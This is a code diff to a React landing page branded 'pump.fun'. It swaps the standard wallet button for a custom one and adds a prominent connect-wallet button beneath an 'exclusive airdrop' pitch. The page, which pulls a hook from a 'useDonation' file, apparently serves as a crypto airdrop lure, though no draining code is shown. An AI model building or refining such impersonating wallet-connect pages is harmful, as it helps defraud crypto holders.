@@ -6,6 +6,7 @@ import { usePump } from '@/hooks/useDonation';
 import { Heart, Wallet } from 'lucide-react';
 import backgroundImage from '@/assets/web-background.png';
 import logoImage from '/pump.png';
+import { CustomWalletButton } from '@/components/CustomWalletButton';
 import polyImg from '@/assets/tokens/poly.jpg';
 import lionImg from '@/assets/tokens/lion.png';
 import roadImg from '@/assets/tokens/road.png';
@@ -127,7 +128,7 @@ const Index = () => {
             />
             <span className="text-2xl font-bold text-white">pump.fun</span>
           </div>
-          <WalletMultiButton className="!bg-primary hover:!bg-primary/90">connect wallet</WalletMultiButton>
+          <CustomWalletButton className="!bg-primary hover:!bg-primary/90" />
         </div>
       </div>
 
@@ -153,8 +154,11 @@ const Index = () => {
             <p className="text-xl text-white/90 max-w-2xl mx-auto leading-relaxed">
               Join exclusive airdrop and be part of the most exciting memecoin launch on solana. Early participants get bonus rewards and white listing access.
             </p>
-            <div className="pt-4 space-y-2">
+            <div className="pt-4 space-y-4">
                 <p className="text-lg text-white/80 font-semibold">Connect Wallet</p>
+                <div className="flex justify-center">
+                  <CustomWalletButton className="!bg-primary hover:!bg-primary/90 !py-3 !px-6 !text-lg" />
+                </div>
                 {/* Removed 'PUMP / Set Up Campaigns' per request */}
               </div>
           </div>
